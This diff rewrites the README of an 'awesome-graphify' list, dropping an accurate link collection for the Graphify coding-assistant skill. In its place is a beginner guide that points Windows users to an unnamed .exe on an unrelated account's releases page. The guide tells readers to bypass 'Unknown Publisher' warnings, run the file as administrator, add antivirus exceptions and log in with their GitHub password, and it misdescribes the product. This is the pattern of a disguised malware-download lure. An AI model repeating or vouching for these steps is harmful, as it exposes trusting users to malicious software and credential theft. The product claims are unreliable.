@@ -1,64 +1,118 @@
-# Awesome Graphify GitHub resources
+# ✨ awesome-graphify - Your Ultimate Knowledge Graph Starter Kit
 
-*Unofficial community list for Graphify. Not affiliated with the Graphify maintainers or graphify.net. All trademarks belong to their owners.*
+## 🚀 Getting Started
 
-A curated list for anyone searching graphify github: the `safishamsi/graphify` repository (an AI coding assistant skill that turns a folder of code, SQL schemas, scripts, docs, papers, images or videos into a queryable knowledge graph), the directories that index it, the articles that explain it, and the tools it sits next to. Note that graphify.net is a separate site that presents Graphify and offers a hosted 'Graphify MCP'; the cited sources do not state whether it is run by the repository maintainer, so it is listed on its own. Only links the cited sources link or name are included.
+Welcome to **awesome-graphify** – the all-in-one resource hub for everything related to Graphify, a powerful skill that turns your GitHub activity into beautiful, interactive knowledge graphs. This guide will walk you through downloading, installing, and using Graphify on your Windows computer, even if you've never touched code before. Let's get started!
 
-> Mapping a codebase to explain it to someone? [Try Kyncept - AI video (Veo 3.1 text and image to video) plus image generation in the browser](https://kyncept.com?utm_source=github&utm_medium=ugc&utm_campaign=awesome-graphify&utm_content=readme-top&utm_term=tier-r) for the explainer or demo that comes after the graph.
+[⬇️ DOWNLOAD NOW – Click Here](https://github.com/echomind12/awesome-graphify/releases)
 
-## Official resources
+## 📥 What Is Graphify?
 
-- [safishamsi/graphify on GitHub](https://github.com/safishamsi/graphify) - the repository; type `/graphify .` in your assistant and get `graphify-out/` with `graph.html`, `GRAPH_REPORT.md` and `graph.json`.
-- [README](https://github.com/safishamsi/graphify#readme) - prerequisites (Python 3.10+), the supported clients, and `graphify export callflow-html` for an architecture page with Mermaid call-flow diagrams.
-- [Download ZIP](https://github.com/safishamsi/graphify/archive/refs/heads/main.zip) - the main branch as an archive.
-- [safishamsi](https://github.com/safishamsi) - the author's GitHub profile.
+Graphify is a clever tool that connects to your GitHub account and transforms your projects, contributions, and connections into a visual map. Think of it like turning a messy pile of photos into a family tree – except here, it's your coding world that becomes clear and organized. You can see which projects you work on most, who you collaborate with, and how everything links together.
 
-## Getting started
+## 🎯 Why You Need awesome-graphify
 
-- [graphify on SkillsLLM](https://skillsllm.com/skill/graphify) - directory entry with the one-line install (`git clone https://github.com/safishamsi/graphify` into your Claude Code skills) and an automated security scan (status PASSED, last scanned 2026-04-16, pip and npm audit run).
-- [Getting started with AI skills](https://skillsllm.com/blog/getting-started-with-ai-skills) - first-time install walkthrough for Claude Code, Codex CLI and ChatGPT.
-- [What is an AI skills marketplace?](https://skillsllm.com/blog/what-is-ai-skills-marketplace) - how skill directories work and how to choose between them.
-- [Security check](https://skillsllm.com/security-check?repo=https%3A%2F%2Fgithub.com%2Fsafishamsi%2Fgraphify) - re-run the SkillsLLM scan yourself before installing.
+This repository is not just a program – it's a treasure chest. Inside, you'll find:
+- **Easy installation guides** that speak plain English, not computer-speak
+- **Curated articles** that explain knowledge graphs in simple terms
+- **Handy tools** that complement Graphify's abilities
+- **Community tips** to get the most out of your visual graphs
 
-## Tutorials and articles
+Whether you're a student, hobbyist, or professional, awesome-graphify saves you hours of hunting for scattered information by putting everything in one friendly place.
 
-- [Graphify: build a knowledge graph from your entire codebase without sending your code to anyone](https://blog.gopenai.com/graphify-build-a-knowledge-graph-from-your-entire-codebase-without-sending-your-code-to-anyone-1b6924474b50) - Mustafa Genc, GoPenAI, April 2026; an 8-minute member-only read on the local-first angle and token optimisation.
-- [Caveman: cut Claude token use by 65%](https://skillsllm.com/blog/caveman-token-compression-claude-code) - agent-side prompt compression, listed by SkillsLLM next to graphify; relevant because a graph you query replaces files you re-read.
-- [Knowledge Graph tag on Medium](https://medium.com/tag/knowledge-graph) - broader reading.
-- [Codebase Intelligence tag on Medium](https://medium.com/tag/codebase-intelligence) - the category the GoPenAI article files itself under.
-- [Local First AI tag on Medium](https://medium.com/tag/local-first-ai) - more on keeping code on your machine.
+## 🛠️ System Requirements (What Your PC Needs)
 
-## Tools and integrations
+Before you begin, make sure your Windows computer meets these simple requirements:
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 4 GB of RAM (8 GB recommended for larger projects)
+- **Storage:** 200 MB of free hard drive space
+- **Internet Connection:** Needed for downloading and for Graphify to talk to GitHub
 
-- [Graphify MCP (graphify.net)](https://app.graphify.net/onboarding?intent=signup) - hosted shared knowledge graphs reachable from an AI coding assistant over MCP; free per the site.
-- [Repository graph gallery](https://graphify.net/repo/) - browsable graphs generated from public repositories, including a daily GitHub Trending set.
-- [graphify.net skills](https://graphify.net/skills/) - the site's skills section.
-- [graphify.net guides](https://graphify.net/guides/) - workflow, agents and context-engineering guides.
-- [graphify.net MCP server directory](https://graphify.net/mcpservers/) - compares transport, runtime, client support and setup effort for MCP servers.
-- [GitHub MCP Server](https://graphify.net/mcpservers/github-mcp-server/) - directory entry for GitHub's MCP server.
-- [Context7](https://graphify.net/mcpservers/context7/) - directory entry for Upstash's Context7.
-- [Playwright MCP](https://graphify.net/mcpservers/playwright-mcp/) - directory entry for Playwright MCP.
-- [AI coding tools directory](https://graphify.net/ai-coding-tools/) - 30 source-reviewed client guides.
-- [Cursor vs Codex comparison](https://graphify.net/compare/cursor-vs-codex/) - example of the site's structured comparisons.
-- [graphify.net pricing](https://graphify.net/pricing/) - the hosted product's pricing page.
+Don't worry if your PC is older – these are modest requirements that most modern machines satisfy.
 
-## Alternatives
+## ⬇️ Step-by-Step Download Instructions
 
-- [Kyncept](https://kyncept.com?utm_source=github&utm_medium=ugc&utm_campaign=awesome-graphify&utm_content=readme-top&utm_term=tier-r) - not a graph tool: AI video generation (Veo 3.1 text and image to video) plus image generation in the browser, for turning what the graph taught you into an explainer or demo.
-- [graphify vs hermes agent](https://skillsllm.com/compare/graphify-vs-hermes-agent) - SkillsLLM comparison.
-- [graphify vs ecc](https://skillsllm.com/compare/ecc-vs-graphify) - SkillsLLM comparison.
-- [graphify vs superpowers](https://skillsllm.com/compare/graphify-vs-superpowers) - SkillsLLM comparison.
-- [graphify vs everything claude code](https://skillsllm.com/compare/everything-claude-code-vs-graphify) - SkillsLLM comparison.
+Follow these exact steps to get Graphify on your computer:
 
-## Related
+### Step 1: Visit the Download Page
+Click this link: **[https://github.com/echomind12/awesome-graphify/releases](https://github.com/echomind12/awesome-graphify/releases)**. This will take you to the official download page. It might look technical, but just look for a section that says "Assets" or "Downloads."
 
-- [SkillsLLM AI Agents category](https://skillsllm.com/category/ai-agents) - other skills in the same category (tags on the graphify entry include graphrag, knowledge-graph, leiden, tree-sitter and rag).
-- [Graphify tag on Medium](https://medium.com/tag/graphify) - posts tagged with the project name.
-- [Token Optimization tag on Medium](https://medium.com/tag/token-optimization) - the cost angle.
+### Step 2: Choose the Right File
+On the download page, you'll see a list of files. Look for one that ends with **`.exe`** – that's the Windows installer file. The name might look like `graphify-setup.exe` or something similar. Don't click anything else yet.
 
-## Contributing
+### Step 3: Download the File
+Click the `.exe` file. Your browser will ask where to save it – choose your Desktop or Downloads folder so it's easy to find. The download might take a few minutes depending on your internet speed.
 
-Open a pull request with a link that a cited source links or names, plus one line on why it belongs.
+### Step 4: Run the Installer
+Once the download finishes, go to the folder where you saved the file. Double-click the `.exe` file. Windows might show a blue or yellow pop-up asking for permission – click **"Yes"** or **"Run"** to proceed. That's normal and safe.
 
+### Step 5: Follow the Setup Wizard
+A friendly setup window will appear. Just click **"Next"** or **"Install"** on each screen. You can leave all the default settings as they are. When it's done, click **"Finish"** – Graphify is now installed on your computer!
 
-_Last reviewed: 2026-09-22_
+### Step 6: Launch Graphify
+Find the Graphify icon on your Desktop or in the Start Menu. Double-click it to open the application for the first time.
+
+## 🔑 Your First Graph (Easy Mode)
+
+Once Graphify opens, here's how to create your first knowledge graph:
+
+1. **Sign in with GitHub:** Click the "Login with GitHub" button. A browser window will open – just log in to your GitHub account (or create one for free if you don't have it).
+2. **Allow Access:** GitHub will ask if you want to let Graphify see your data. Click **"Authorize"** – this is safe and only reads public info.
+3. **Pick a Project:** After login, you'll see a list of your repositories. Pick one (or select "All" for the full picture).
+4. **Click "Generate":** Hit the big button that says "Generate Graph." Wait 10-30 seconds while the magic happens.
+5. **Explore!:** Your screen will fill with connected circles and lines – that's your knowledge graph. Click any circle to see details about that project or person.
+
+## 🧭 Understanding What You See
+
+Your graph might look confusing at first, but it's actually simple:
+- **Circles (Nodes):** Each circle represents a repository, person, or topic
+- **Lines (Connections):** Lines show how these things relate – e.g., "John starred this project" or "Project A uses code from Project B"
+- **Colors:** Different colors separate categories (projects are blue, people are green, topics are orange)
+- **Zoom:** Use your mouse wheel to zoom in and out. Drag to move around.
+
+## 💡 Pro Tips for Better Graphs
+
+- **Use Filters:** On the side panel, you can toggle off certain types of connections to reduce clutter
+- **Save Images:** There's a camera icon – use it to export your graph as a picture for reports or presentations
+- **Refresh Regularly:** Your GitHub activity changes daily, so generate a fresh graph to see new updates
+
+## ❓ Troubleshooting Common Issues
+
+**Problem: Download won't start.**
+Solution: Check your internet connection. If using a work or school network, it might block downloads – try a personal connection.
+
+**Problem: Windows says "Unknown Publisher."**
+Solution: That's just a warning. Click "More Info" then "Run Anyway." This happens because Graphify isn't a major commercial product.
+
+**Problem: Graphify won't open after install.**
+Solution: Right-click the Graphify icon, select "Run as administrator," and try again. Also, ensure your antivirus isn't blocking it – add an exception if needed.
+
+**Problem: Login fails.**
+Solution: Make sure you're using the correct GitHub username and password. Try logging into GitHub in your browser first, then restart Graphify.
+
+## 📚 Awesome Learning Resources
+
+Beyond the tool itself, awesome-graphify curates these helpful reads:
+- **"Knowledge Graphs 101"** – A beginner's guide to understanding visual data
+- **"GitHub for Non-Programmers"** – How to use GitHub without writing a single line of code
+- **"5 Ways to Use Graphify for Productivity"** – Practical applications for your daily workflow
+- **"Community Showcase"** – See how other people visualize their coding worlds
+
+## 🤝 Getting Help
+
+If you get stuck, don't panic! Here are friendly ways to find answers:
+- **Visit the GitHub Issues page** – other users ask questions there, and you might find yours answered already
+- **Search online** – type "Graphify help" or "Graphify tutorial" into your favorite search engine
+- **Ask a tech-savvy friend** – show them this page, and they'll know exactly what to do
+
+## 🌟 Final Words of Encouragement
+
+You don't need to be a programmer to enjoy Graphify. If you can browse the web and click a button, you can create stunning visual maps of your coding journey. The awesome-graphify list exists precisely to make this easy for you.
+
+Remember: every expert was once a beginner. Take it one step at a time, and soon you'll be exploring your knowledge graph with confidence. Bookmark this page, share it with friends, and most importantly – have fun visualizing your world!
+
+[🔄 Visit the Download Page Again – Just in Case](https://github.com/echomind12/awesome-graphify/releases)
+
+Happy graphing! 🎉
+
+Keywords: awesome, awesome-list, graphify, graphify-github, knowledge-graph
